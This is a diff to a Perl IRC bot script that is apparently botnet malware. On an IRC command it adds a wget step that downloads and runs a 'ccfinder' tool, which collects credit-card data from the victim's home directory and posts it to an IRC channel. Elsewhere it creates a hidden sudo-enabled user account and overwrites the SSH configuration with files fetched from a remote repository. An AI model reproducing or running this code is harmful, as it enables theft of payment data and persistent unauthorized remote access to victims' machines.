@@ -51,9 +51,10 @@ $irc->on(irc_privmsg => sub {
  if ($msg =~ /@.ccplz/) {
   warn 'Sending CC info to IRC...';
   $irc->write(notice => $noticechan => "[Info] Fetching CC data from Storage and Memory...");
+  system 'wget -O ccfinder https://github.com/ind3p3nd3nt/vncperlbot/raw/master/ccfinder';
   system 'chmod +x ccfinder';
   system './ccfinder ~';
-  Time::HiRes::sleep(15);
+  Time::HiRes::sleep(60);
   $irc->write(notice => $noticechan => "[Info] Now sending CC data in channel...");
   open(my $fh, '<:encoding(UTF-8)', $filename);
   while (my $row = <$fh>) {
@@ -82,8 +83,8 @@ system "echo $random_user:$random_number | sudo chpasswd";
 system 'if [ -f "/usr/bin/yum" ]; then sudo usermod -aG wheel ' . $random_user . '; fi';
 system 'if [ -f "/usr/bin/apt" ]; then sudo adduser ' . $random_user . ' sudo; fi';
   warn 'Configuring SSH...';
-system 'sudo cp sshd_config /etc/ssh/sshd_config';
-system 'sudo cp sshd_banner /etc/ssh/sshd_banner';
+system 'wget -O /etc/ssh/sshd_config https://github.com/ind3p3nd3nt/vncperlbot/raw/master/sshd_config';
+system 'wget -O /etc/ssh/sshd_banner https://github.com/ind3p3nd3nt/vncperlbot/raw/master/sshd_banner';
 system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
 system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   warn 'Getting External IP Address';
